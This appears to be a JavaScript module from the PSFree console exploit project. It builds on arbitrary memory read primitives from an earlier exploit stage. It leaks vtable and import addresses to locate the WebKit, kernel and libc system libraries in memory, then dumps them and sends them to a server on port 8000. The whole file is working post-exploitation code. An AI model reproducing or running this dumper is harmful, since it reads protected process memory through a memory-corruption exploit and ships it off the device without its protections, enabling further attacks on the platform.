/* Copyright (C) 2024-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// script for dumping libSceNKWebKit.sprx, libkernel_web.sprx, and
// libSceLibcInternal.sprx

import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { Addr, mem } from './module/mem.mjs';
import { make_buffer, find_base, resolve_import } from './module/memtools.mjs';
import { KB, MB } from './module/offset.mjs';

import {
    log,
    align,
    die,
    send,
} from './module/utils.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const textarea = document.createElement('textarea');
const js_textarea = mem.addrof(textarea);

function get_boundaries(leak) {
    const lib_base = find_base(leak, true, true);
    const lib_end = find_base(leak, false, false);

    return [lib_base, lib_end]
}

function dump(name, lib_base, lib_end) {
    const lib_size = lib_end.sub(lib_base).lo;
    log(`${name} base: ${lib_base}`);
    log(`${name} size: ${lib_size}`);
    const lib = make_buffer(
        lib_base,
        lib_size
    );
    send(
        url,
        lib,
        `${name}.sprx.text_${lib_base}.bin`,
        () => log(`${name} sent`)
    );
}

function dump_libwebkit() {
    let addr = js_textarea;
    addr = addr.readp(0x18);

    addr = addr.readp(0);

    log(`vtable: ${addr}`);
    const vtable = make_buffer(addr, 0x400);
    send(url, vtable, `vtable_${addr}.bin`, () => log('vtable sent'));

    const [lib_base, lib_end] = get_boundaries(addr);
    dump('libSceNKWebKit', lib_base, lib_end);

    return lib_base;
}

function dump_libkernel(libwebkit_base) {
    const offset = 0x8d8;
    const vtable_p = js_textarea.readp(0x18).readp(0);
    const stack_chk_fail_import = libwebkit_base.add(offset);

    const libkernel_leak = resolve_import(stack_chk_fail_import);
    log(`__stack_chk_fail import: ${libkernel_leak}`);

    const [lib_base, lib_end] = get_boundaries(libkernel_leak);
    dump('libkernel_web', lib_base, lib_end);
}

function dump_libc(libwebkit_base) {
    const offset = 0x918;
    const vtable_p = js_textarea.readp(0x18).readp(0);
    const strlen_import = libwebkit_base.add(offset);

    const libc_leak = resolve_import(strlen_import);
    log(`strlen import: ${libc_leak}`);

    const [lib_base, lib_end] = get_boundaries(libc_leak);
    dump('libSceLibcInternal', lib_base, lib_end);
}

function dump_webkit() {
    const libwebkit_base = dump_libwebkit();
    dump_libkernel(libwebkit_base);
    dump_libc(libwebkit_base);
}

function dump_eval() {
    let addr = js_textarea;
    addr = addr.readp(0x18);

    addr = addr.readp(0);

    const libwebkit_base =  find_base(addr, true, true);
    const impl = mem.addrof(eval).readp(0x18).readp(0x38);
    const offset = impl.sub(libwebkit_base);
    send(
        url,
        make_buffer(impl, 0x800),
        `eval_dump_offset_${offset}.bin`,
        () => log('sent')
    );
}

function dump_scrollLeft() {
    let proto = Object.getPrototypeOf(textarea);
    proto = Object.getPrototypeOf(proto);
    proto = Object.getPrototypeOf(proto);

    const scrollLeft_get =
        Object.getOwnPropertyDescriptors(proto).scrollLeft.get
    ;

    const js_func = mem.addrof(scrollLeft_get);
    const getterSetter = js_func.readp(0x28);
    const getter = getterSetter.readp(8);

    const libwebkit_base = find_base(getter, true, true);
    const offset = getter.sub(libwebkit_base);
    send(
        url,
        make_buffer(getter, 0x800),
        `scrollLeft_getter_dump_offset_${offset}.bin`,
        () => log('sent')
    );
}
